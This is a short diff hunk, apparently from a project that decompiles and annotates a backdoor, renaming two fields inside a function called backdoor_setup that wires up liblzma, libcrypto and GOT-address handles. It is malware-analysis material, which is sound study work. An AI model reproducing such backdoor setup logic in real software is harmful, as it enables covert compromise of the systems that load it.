@@ -129,8 +129,8 @@ BOOL backdoor_setup(backdoor_setup_params_t *params)
   local_980.elf_handles.liblzma = &local_980.liblzma_info;
   local_980.elf_handles.libcrypto = &local_980.libcrypto_info;
   local_980.elf_handles.main = &local_980.main_info;
-  local_980.data_handle.data = &local_980;
-  local_980.data_handle.elf_handles = elf_handles;
+  local_980.data_handle.runtime_data = &local_980;
+  local_980.data_handle.cached_elf_handles = elf_handles;
   update_got_address(peVar49);
   code_segment = (peVar49->got_ctx).got_ptr;
   if (code_segment != (void *)0x0) {
